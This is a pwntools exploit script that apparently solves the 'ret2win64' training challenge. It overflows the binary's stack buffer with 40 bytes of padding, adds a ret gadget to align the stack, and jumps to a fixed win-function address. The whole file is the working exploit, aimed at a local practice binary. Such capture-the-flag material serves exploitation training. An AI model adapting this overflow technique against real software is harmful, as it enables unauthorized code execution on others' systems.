#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ret2win64
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ret2win64')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
io.recvuntil("> ")

"""
0x000000000040053e: ret;    # For solving movaps issue in Ubuntu, a simple ret helps to align the stack in 16byte
"""
ret = p64(0x000000000040053e)

buf = ""
buf += "A"*40
buf += ret
buf += p64(0x400756)


write("in.txt", buf)
io.sendline(buf)
io.interactive()

